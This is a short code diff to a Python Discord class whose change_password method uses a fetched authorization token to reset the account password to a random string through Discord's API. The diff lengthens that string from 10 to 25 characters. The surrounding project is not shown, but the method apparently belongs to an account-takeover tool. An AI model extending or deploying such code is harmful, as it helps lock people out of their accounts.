@@ -43,7 +43,7 @@ class Discord:
             None
             
     def change_password(code: str, password: str) -> str:
-        new_password: str = Random.string(10)
+        new_password: str = Random.string(25)
         
         headers = {
             "authorization": Fetch.authorization_token(),
@@ -56,7 +56,7 @@ class Discord:
         }
         
         response = httpx_client.patch("https://canary.discord.com/api/v9/users/@me", headers=headers, json=payload)
-z        
+        
         if response.status_code == 200:
             return new_password
         
